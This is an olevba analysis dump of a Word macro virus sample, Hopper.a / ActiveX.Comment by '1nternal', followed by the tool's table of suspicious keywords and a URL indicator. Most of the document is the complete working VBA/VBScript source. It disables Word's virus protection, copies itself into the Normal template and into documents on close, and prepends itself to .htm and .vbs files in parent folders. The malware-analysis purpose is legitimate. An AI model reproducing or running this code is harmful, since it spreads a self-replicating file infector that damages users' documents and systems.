olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Hopper.a-60ac6fb0df8fd3db649171fc73cc445ba3218db6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Hopper.a-60ac6fb0df8fd3db649171fc73cc445ba3218db6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<html> <!--1nternal-->
'<head>
'<meta http-equiv="Content-Type"
'content="text/html; charset=iso-8859-1">
'<meta name="Author" content="1nternal">
'</head>
'<BODY>
'<script language="VBScript"><!--

Private FSO, NT, HostType, InfType, HostPath, Target, NextLine, TempFile

Private Sub WscriptCode()
    On Error Resume Next
    HostType = "VBS"
    HostPath = Wscript.ScriptFullName
    Call InfWord
    Call FindHTMVBS
End Sub

Private Sub FindHTMVBS()
    Set FSO = CreateObject("Scripting.FileSystemObject")
    cpath = FSO.GetParentFolderName(HostPath)
    Set folder = FSO.GetFolder(cpath)
    While folder.IsRootFolder = False
        Set folder = FSO.GetFolder(cpath)
        Set fc = folder.Files
        cpath = FSO.GetParentFolderName(cpath)
        For Each Target In fc
            InfType = LCase(FSO.GetExtensionName(Target.Name))
            If InfType = "html" Then InfType = "htm"
            If InfType = "htm" Or InfType = "vbs" And Target.Path <> HostName Then
                Set fh = FSO.opentextfile(Target.Path, 1, True)
                TestString = fh.ReadLine
                fh.Close
                If TestString <> "<html> <!--1nternal-->" And TestString <> "'<html> <!--1nternal-->" Then
                    Call DoFile
                End If
            End If
        Next
    Wend
End Sub

Private Sub InfWord()
    Set WordObj = CreateObject("Word.Application")
    Set NT = WordObj.Templates(1).VBProject.VBComponents(1).CodeModule
    If NT.Lines(1, 1) <> "'<html> <!--1nternal-->" Then
        WordObj.Options.SaveNormalPrompt = False
        NT.DeleteLines 1, NT.CountOfLines
        NT.AddFromFile HostPath
        NT.DeleteLines 181, (NT.CountOfLines - 180)
        If HostType = "HTM" Then
            For j = 1 To 9
                NT.ReplaceLine j, "'" + NT.Lines(j, 1)
            Next
            For j = 178 To 180
                NT.ReplaceLine j, "'" + NT.Lines(j, 1)
            Next
        Else
            NT.ReplaceLine 12, Mid(NT.Lines(12, 1), 2)
            NT.ReplaceLine 18, Mid(NT.Lines(18, 1), 2)
        End If
    End If
    Set NT = Nothing
    WordObj.Quit
End Sub

Private Sub Window_Onload()
    Randomize
    If Location.protocol = "file:" And (Int((6 * Rnd) + 1) = 1) Then Call Offline
End Sub

Private Sub Offline()
    Dim FSO, folder, fc, f1, cpath
    Set FSO = CreateObject("Scripting.FileSystemObject")
    HostPath = Replace(Location.href, "file:///", "")
    HostPath = Replace(HostPath, "/", "\")
    HostType = "HTM"
    Call InfWord
    Call FindHTMVBS
    Window.Status = "ActiveX.Comment /1nternal"
End Sub

Private Sub Document_Close()
    On Error Resume Next
    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    Options.VirusProtection = False
        Options.ConfirmConversions = False
        Options.SaveNormalPrompt = False
        If NT.Lines(1, 1) <> "'<html> <!--1nternal-->" Then
                For i = 1 To 180
                        NT.InsertLines i, AD.Lines(i, 1)
                Next
        End If
        If AD.Lines(1, 1) <> "'<html> <!--1nternal-->" Then
                For i = 1 To 180
                        AD.InsertLines i, NT.Lines(i, 1)
                Next
        End If
    HostType = "DOC"
    HostPath = "C:\Windows\Web\Afile.htm"
    If (Int((15 * Rnd) + 1) = 1) Then Call FindHTMVBS
Break:
End Sub

Private Sub CheckLine(LineNumber)
    If HostType = "DOC" Then
        If InfType = "htm" Then
            If LineNumber < 9 Or LineNumber > 177 Then
                NextLine = Mid(NextLine, 2)
            End If
        Else
            If LineNumber = 12 Or LineNumber = 18 Then
                NextLine = "'" + NextLine
            End If
        End If
    ElseIf HostType = "HTM" Then
        If InfType = "vbs" Then
            If LineNumber < 9 Or LineNumber > 177 Then
                NextLine = "'" + NextLine
            End If
            If LineNumber = 12 Or LineNumber = 18 Then
                NextLine = "'" + NextLine
            End If
        End If
    Else
        If InfType = "htm" Then
            If LineNumber < 9 Or LineNumber > 177 Then
                NextLine = Mid(NextLine, 2)
            End If
            If LineNumber = 12 Or LineNumber = 18 Then
                NextLine = Mid(NextLine, 2)
            End If
        End If
    End If
End Sub

Private Sub DoFileFromFile()
    Set fh = FSO.opentextfile(HostPath, 1, True)
    Set ft = FSO.opentextfile(Target.Path, 2, True)
    For j = 1 To 180
        NextLine = fh.ReadLine
        Call CheckLine(j)
        ft.WriteLine NextLine
    Next
    fh.Close
    ft.Close
End Sub

Private Sub DoFileFromDoc()
    Set ft = FSO.opentextfile(Target.Path, 2, True)
    For j = 1 To 180
        NextLine = NT.Lines(j, 1)
        Call CheckLine(j)
        ft.WriteLine NextLine
    Next
    ft.Close
End Sub

Private Sub DoFile()
    TempFile = FSO.GetTempName
    FSO.CopyFile Target.Path, TempFile
    If HostType = "DOC" Then
        Call DoFileFromDoc
    Else
        Call DoFileFromFile
    End If
    Set fh = FSO.opentextfile(TempFile, 1, True)
    Set ft = FSO.opentextfile(Target.Path, 8, True)
    Do While fh.AtEndOfStream <> True
        ft.WriteLine fh.ReadLine
    Loop
    ft.Close
    fh.Close
    FSO.DeleteFile TempFile
End Sub

'--></script>
'</BODY>
'</HTML>
'<html>

'<head>
'<meta http-equiv="Content-Type"
'content="text/html; charset=iso-8859-1">
'<meta name="Author" content="1nternal">
'<title>ActiveX.Comment</title>
'</head>

'<body>

'<p align="center">&nbsp;</p>

'<p align="center">&nbsp;</p>

'<p align="center"><strong>ActiveX.Comment v0.1</strong></p>

'<p align="center">/ 1nternal</p>

'<p align="center"><a
'href="http://www.sourceofkaos.com/homes/1nternal">1nternal's
'VX Site</a></p>

'<p>&nbsp;</p>
'</body>
'</html>
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.sourceofk|URL                                          |
|          |aos.com/homes/1ntern|                                             |
|          |al                  |                                             |
+----------+--------------------+---------------------------------------------+

